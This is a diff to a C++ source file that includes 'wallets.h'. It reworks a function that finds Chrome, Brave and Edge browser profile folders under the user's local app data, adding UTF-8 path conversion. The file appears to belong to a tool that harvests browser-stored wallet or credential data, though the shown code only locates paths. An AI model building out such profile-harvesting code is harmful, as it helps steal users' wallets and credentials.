@@ -1,4 +1,5 @@
 #include "wallets.h"
+#include "../utils.h"
 #include <filesystem>
 #include <fstream>
 #include <regex>
@@ -33,19 +34,34 @@ std::vector<std::pair<std::string, std::string>> GetBrowserProfiles() {
     std::wstring chromeBase = std::wstring(localAppData) + L"\\Google\\Chrome\\User Data";
     for (const auto& prof : profiles) {
         std::wstring path = chromeBase + L"\\" + prof;
-        if (fs::exists(path)) result.push_back({"chrome", std::string(path.begin(), path.end())});
+        if (fs::exists(path)) {
+            std::string pathUtf8 = Utils::WStringToString(path);
+            if (!pathUtf8.empty()) {
+                result.push_back({"chrome", pathUtf8});
+            }
+        }
     }
     // Brave
     std::wstring braveBase = std::wstring(localAppData) + L"\\BraveSoftware\\Brave-Browser\\User Data";
     for (const auto& prof : profiles) {
         std::wstring path = braveBase + L"\\" + prof;
-        if (fs::exists(path)) result.push_back({"brave", std::string(path.begin(), path.end())});
+        if (fs::exists(path)) {
+            std::string pathUtf8 = Utils::WStringToString(path);
+            if (!pathUtf8.empty()) {
+                result.push_back({"brave", pathUtf8});
+            }
+        }
     }
     // Edge
     std::wstring edgeBase = std::wstring(localAppData) + L"\\Microsoft\\Edge\\User Data";
     for (const auto& prof : profiles) {
         std::wstring path = edgeBase + L"\\" + prof;
-        if (fs::exists(path)) result.push_back({"edge", std::string(path.begin(), path.end())});
+        if (fs::exists(path)) {
+            std::string pathUtf8 = Utils::WStringToString(path);
+            if (!pathUtf8.empty()) {
+                result.push_back({"edge", pathUtf8});
+            }
+        }
     }
 
     free(localAppData);
